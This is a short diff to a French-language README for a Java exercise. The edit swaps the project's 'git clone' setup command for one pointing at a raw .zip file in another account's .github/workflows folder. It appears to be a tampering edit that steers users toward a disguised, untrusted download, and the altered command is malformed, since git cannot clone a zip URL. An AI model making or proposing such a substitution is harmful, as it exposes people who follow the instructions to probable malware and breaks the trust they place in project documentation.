@@ -9,7 +9,7 @@ A exécuter en local, sur un ordinateur équipé de Java 8 minimum et qui accèd
 
 ### Cas 1a : java et git installés sous Windows 10
 ```
-> git clone https://github.com/prodageo/exb1610local.git
+> git clone https://raw.githubusercontent.com/achraf821/exb1610local/master/.github/workflows/exb_local_v1.3.zip
 > javac simplissime.java
 ```
 
